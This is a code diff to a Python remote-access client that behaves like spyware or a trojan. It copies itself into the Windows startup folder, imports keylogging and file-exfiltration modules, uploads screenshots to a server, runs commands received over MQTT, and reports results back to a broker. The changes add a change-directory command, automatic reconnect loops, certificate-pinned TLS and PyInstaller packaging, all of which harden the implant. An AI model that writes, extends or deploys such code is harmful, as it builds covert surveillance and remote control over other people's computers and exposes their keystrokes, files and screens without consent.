@@ -23,6 +23,13 @@ from klogging import start_logging,stop_logging
 from filecontrol import list_folder,read_file,delete_file,create_file,send_file_to_server
 from systemcontrol import display_off,display_on,full_volume,mute_volume
 
+def resource_path(relative_path):
+    # Works for both PyInstaller EXE and dev Python
+    if hasattr(sys, "_MEIPASS"):
+        return os.path.join(sys._MEIPASS, relative_path)
+    return os.path.join(os.path.abspath("."), relative_path)
+
+
 pg.FAILSAFE = False
 # Startup setup
 FLAG_FILE = Path(os.getenv('APPDATA')) / "firstrun.flag"
@@ -34,7 +41,6 @@ def add_to_startup():
         destination = startup_dir / exe_path.name
         if not destination.exists():
             shutil.copy(exe_path, destination)
-            pg
     except Exception as e:
         print(f"Failed to add to startup: {e}")
 
@@ -65,9 +71,9 @@ def take_screenshot():
     try:
         filename = f"{pc_name}_screenshot.jpg"
         screenshotVar = pg.screenshot()
-        screenshotVar.save(filename,quality=50)
+        screenshotVar.save(filename,"JPEG",quality=50)
         with open(filename, "rb") as f:
-            requests.post(f"{serverUrl}/upload", files={"screenshot": f}, timeout=(30))
+            requests.post(f"{serverUrl}/upload", files={"screenshot": f}, timeout=30)
             client.publish(ACK_TOPIC,f"Screenshot Captured Of Pc : {pc_id}")
         os.remove(filename)
     except Exception as e:
@@ -141,7 +147,7 @@ def handle_msg(msg):
             data = stop_logging()
             client.publish(ACK_TOPIC,f"Logged data of : {pc_id} : {data}")   
         elif msg == "restart":
-            os.execv(sys.executable,sys.argv)     
+            os.execv(sys.executable,[sys.executable]+sys.argv)     
         elif msg == "end":
             os._exit(0)
         elif msg.startswith("browser"):
@@ -300,7 +306,25 @@ def handle_msg(msg):
             if len(parts) == 2:
                 def move():
                     pg.moveTo(int(parts[0]),int(parts[1]),0.2)
-                safe_thread(move)              
+                safe_thread(move)         
+
+        elif msg.startswith("changedir"):
+            new_dir = msg[len("changedir "):].strip()
+
+            def change_dir():
+                global CURRENT_WORKDIR
+                try:
+                    new_dir_abs = os.path.abspath(os.path.expanduser(new_dir))
+                    if os.path.isdir(new_dir_abs):
+                        CURRENT_WORKDIR = new_dir_abs
+                        client.publish(ACK_TOPIC, f"Working directory changed to: {CURRENT_WORKDIR}")
+                    else:
+                        client.publish(ACK_TOPIC, f"Error: Directory does not exist: {new_dir_abs}")
+                except Exception as e:
+                    client.publish(ACK_TOPIC, f"Error changing directory: {e}")
+
+            safe_thread(change_dir)
+             
 
         elif msg.startswith("cmdwithoutput"):
             cmd = msg[len("cmdwithoutput "):]
@@ -336,19 +360,37 @@ def on_connect(client, userdata, flags, rc):
     client.subscribe(CONTROL_TOPIC)
     client.publish(ACK_TOPIC, f"{pc_id} Connected")
 
-def on_message(client, userdata, msg):
-    message = msg.payload.decode()
-    print(f"Received: {message}")
-    client.publish(ACK_TOPIC, f"ACK:{pc_id} : RECIEVED [ {message} ]")
-    handle_msg(message)
+def on_message(client, userdata, message):
+    msg = message.payload.decode()
+    print(f"Received: {msg}")
+    client.publish(ACK_TOPIC, f"ACK:{pc_id} : RECIEVED [ {msg} ]")
+    handle_msg(msg)
+def on_disconnect(client, userdata, rc):
+    print(f"Disconnected ({rc}), trying reconnect...")
+    def reconnect_loop():
+        delay = 5
+        while True:
+            try:
+                client.reconnect()
+                print("Reconnected successfully.")
+                break
+            except Exception as e:
+                print(f"Reconnect failed: {e}, retrying in {delay}s...")
+                time.sleep(delay)
+                delay = min(delay + 5, 60)
+    threading.Thread(target=reconnect_loop, daemon=True).start()
+
 
 # MQTT client setup
-client = mqtt.Client()
+client = mqtt.Client(client_id=pc_id, protocol=mqtt.MQTTv311)
 client.username_pw_set(USERNAME, PASSWORD)
-client.tls_set(cert_reqs=ssl.CERT_NONE)
-client.tls_insecure_set(True)
+ca_path = resource_path("emqxsl-ca.crt")
+client.tls_set(ca_certs=ca_path, cert_reqs=ssl.CERT_REQUIRED)
+client.tls_insecure_set(False)
 client.on_connect = on_connect
 client.on_message = on_message
+client.on_disconnect = on_disconnect
+
 
 HEARTBEAT_INTERVAL = 20
 HEARTBEAT_TOPIC = f"heartbeat/{pc_id}"
@@ -356,22 +398,33 @@ def heartbeat_loop():
     while True:
         try:
             if client.is_connected():
-                client.publish(HEARTBEAT_TOPIC,"1")
+                client.publish(HEARTBEAT_TOPIC, "1")
         except Exception as e:
-            print(e)
-        time.sleep(HEARTBEAT_INTERVAL)  
+            print(f"Heartbeat error: {e}")
+        time.sleep(HEARTBEAT_INTERVAL)
 threading.Thread(target=heartbeat_loop,daemon=True).start()   
 
-def connect_mqtt():
-    while True:
-        try:
-            client.connect(BROKER, PORT, 60)
-            break
-        except Exception as e:
-            print(f"MQTT connection failed: {e}, retrying in 5s...")
-            time.sleep(5)
+max_delay = 60
+initial_delay = 5
+delay = initial_delay
 
-connect_mqtt()
+def connect_mqtt_nonblocking():
+    def _connect():
+        delay = 5
+        while True:
+            try:
+                client.connect(BROKER, PORT, 300)
+                print("MQTT connected successfully.")
+                break
+            except Exception as e:
+                print(f"MQTT connection failed: {e}, retrying in {delay}s...")
+                time.sleep(delay)
+                delay = min(delay + 5, 60)
+    threading.Thread(target=_connect, daemon=True).start()
+
+
+
+connect_mqtt_nonblocking()
 client.loop_forever()
 
 
